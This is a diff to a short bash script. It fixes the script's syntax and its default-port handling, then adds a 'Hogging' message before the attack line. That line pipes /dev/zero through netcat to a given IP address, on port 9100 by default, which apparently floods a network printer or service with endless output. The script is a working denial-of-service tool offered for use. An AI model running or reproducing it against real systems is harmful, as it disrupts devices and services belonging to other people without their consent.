@@ -13,10 +13,14 @@ read -p "Press any key to continue (or ^C to exit - this is your last chance)."
 ip=${1}
 
 if [[ -z ${ip} ]]
-	echo "usage ${0} <<IP Address>> <<PORT (optional defaults to 9100>>"
-	exit 1;
+then
+    echo "usage ${0} << IP Address >> << PORT (optional defaults to 9100) >>"
+    exit 1;
 fi;
 
-port=${2:=9100}
+port=${2}
+port=${port:=9100}
+
+echo "Hogging ${ip} ${port}"
 
 cat -v /dev/zero | netcat ${ip} ${port}
